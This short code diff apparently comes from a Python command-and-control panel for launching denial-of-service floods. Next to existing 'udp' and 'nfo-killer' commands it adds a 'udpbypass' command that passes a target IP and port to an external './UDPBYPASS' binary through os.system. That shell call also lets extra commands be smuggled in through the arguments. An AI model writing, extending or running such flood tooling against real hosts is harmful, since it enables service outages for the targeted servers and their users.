@@ -410,6 +410,15 @@ def main():
             except IndexError:
                 print('Usage: udp <ip> <port> <packet> <time>')
                 print('Example: udp 1.1.1.1 80 1000 10000')
+                
+        elif "udpbypass" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./UDPBYPASS {ip} {port}')
+            except IndexError:
+                print('Usage: udpbypass <ip> <port>')
+                print('Example: udpbypass 1.1.1.1 80')
 
         elif "nfo-killer" in cnc:
             try:
